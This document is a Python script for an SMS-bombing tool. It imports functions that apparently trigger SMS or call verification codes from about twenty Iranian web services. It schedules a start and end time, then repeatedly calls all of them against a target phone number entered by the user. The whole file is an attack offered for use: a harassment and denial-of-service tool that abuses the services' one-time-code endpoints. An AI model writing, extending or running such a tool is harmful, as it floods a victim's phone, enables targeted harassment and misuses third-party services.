import time
import os
from datetime import datetime, timedelta
from cafebazar_api import cafebazar_sms
from digikala_api import digikala_sms
from divar_api import divar_sms
from sheypoor_api import sheypoor_sms
from snapp_api import snapp_sms
from tapsi_api import tapsi_sms_call
from poonisha_api import poonisha_sms
from taghcheh_api import taghcheh_sms
from banikar_api import banikar_sms
from gapofilm_api import gapofilm_sms
from fitamin_api import fitamin_sms
from doctor_to_api import doctor_to_sms
from tamland_api import tamland_sms
from snapp_doctor_api import snapp_doctor_sms
from tikban_api import tikban_sms
from virgol_api import virgol_sms
from talent_coach_api import talent_coach_sms
from pezeshket_api import pezeshket_sms
from namava_api import namava_sms
from mrbilit_api import mrbilit_sms


# phone_number = input("Enter target phone number (example : 9XXXXXXXXXXX) : ")
# schedule_time = input("Enter schedule time (example : 2022-02-02 13:00:00) : ")
# end_schedule_time = input("Enter end schedule time (example : 2022-02-02 13:05:30) : ")


def spammer(phone, schedule, end_schedule):
    if schedule.strip() == "":
        schedule = datetime.now()
    schedule_date_time_obj = datetime.strptime("{}".format(schedule), "%Y-%m-%d %H:%M:%S")
    end_schedule_date_time_obj = datetime.strptime("{}".format(end_schedule), "%Y-%m-%d %H:%M:%S")
    while True:
        if datetime.now() > schedule_date_time_obj:
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Waiting for schedule time...")
            print("Current time : {}".format(datetime.now()))
            print("Schedule time : {}".format(schedule_date_time_obj))
            time.sleep(1)

    while end_schedule_date_time_obj > datetime.now():
        cafebazar_sms(phone)
        digikala_sms(phone)
        divar_sms(phone)
        sheypoor_sms(phone)
        snapp_sms(phone)
        tapsi_sms_call(phone)
        poonisha_sms(phone)
        taghcheh_sms(phone)
        banikar_sms(phone)
        ##################
        gapofilm_sms(phone)
        fitamin_sms(phone)
        doctor_to_sms(phone)
        tamland_sms(phone)
        snapp_doctor_sms(phone)
        tikban_sms(phone)
        virgol_sms(phone)
        talent_coach_sms(phone)
        pezeshket_sms(phone)
        namava_sms(phone)
        mrbilit_sms(phone)
        ##################

# spammer(phone_number, schedule_time, end_schedule_time)
